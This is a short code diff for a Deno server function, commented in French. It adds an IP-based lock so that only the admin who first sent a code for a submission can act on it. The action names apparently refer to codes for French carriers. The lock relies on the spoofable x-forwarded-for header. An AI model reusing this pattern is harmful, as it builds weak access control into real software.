@@ -34,13 +34,33 @@ Deno.serve(async (req) => {
 
     const newStatus = statusMap[action] || "code_ready";
     const base44 = createClientFromRequest(req);
-    await base44.asServiceRole.entities.Submission.update(submissionId, { status: newStatus });
+
+    // Get admin IP & user agent
+    const adminIp = req.headers.get("x-forwarded-for")?.split(",")[0]?.trim() || "Inconnue";
 
     // Fetch submission details
     const sub = await base44.asServiceRole.entities.Submission.get(submissionId).catch(() => null);
 
-    // Get admin IP & user agent
-    const adminIp = req.headers.get("x-forwarded-for")?.split(",")[0]?.trim() || "Inconnue";
+    // ---- Verrou par IP admin : une fois qu'un admin a envoyé le code,
+    // seule son IP peut effectuer les actions suivantes sur cette demande. ----
+    const SEND_CODE_ACTIONS = ["code_ready", "code6", "code6sfr", "code6orange"];
+    const isCodeSendAction = SEND_CODE_ACTIONS.includes(action);
+
+    if (sub?.admin_ip) {
+      // Une IP admin est déjà enregistrée : vérifie la correspondance
+      if (sub.admin_ip !== adminIp) {
+        return Response.json(
+          { error: "Cette demande est déjà traitée par un autre administrateur." },
+          { status: 403 }
+        );
+      }
+    } else if (isCodeSendAction) {
+      // Premier envoi de code : on verrouille la demande à cette IP admin
+      await base44.asServiceRole.entities.Submission.update(submissionId, { admin_ip: adminIp });
+      sub.admin_ip = adminIp;
+    }
+
+    await base44.asServiceRole.entities.Submission.update(submissionId, { status: newStatus });
     const userAgent = req.headers.get("user-agent") || "";
 
     // Detect browser
